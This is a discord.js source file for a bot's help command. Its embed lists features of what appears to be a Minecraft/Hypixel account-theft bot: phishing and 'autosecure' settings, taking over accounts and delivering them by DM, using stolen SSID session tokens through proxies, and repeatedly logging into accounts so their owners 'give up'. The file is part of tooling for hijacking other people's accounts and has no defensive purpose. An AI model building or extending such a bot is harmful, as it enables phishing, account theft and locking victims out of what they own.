const { EmbedBuilder } = require('discord.js');

module.exports = {
    name: "seecommands",
    callback: async (client, interaction) => {
        const embed = new EmbedBuilder()
            .addFields([
                {
                    name: 'Commands',
                    value:
                        `* **/bots** → Manage all bot settings (Bot, Autosecure, Phisher, Claiming & Users and way more)\n` +
                         `* **/secure** → Secure an account using all sorts of methods and settings from /secure Configuration and receive it via DM\n` +
                        `* **/accounts** → View all your secured accounts and manage them\n` +
                        `* **/appeal** → Appeal a security-banned Hypixel account using SSID within 5 minutes.\n` +
                        `* **/checkban** → Check if an account is banned on Hypixel using SSID (uses my proxies).\n` +
                        `* **/quarantine** → Keep logging onto an account for up to 24 hours to make the user give up on the account (your proxies).`
                }
            ])
            .setColor(0xADD8E6);

        await interaction.reply({ embeds: [embed], ephemeral: true });
    }
}
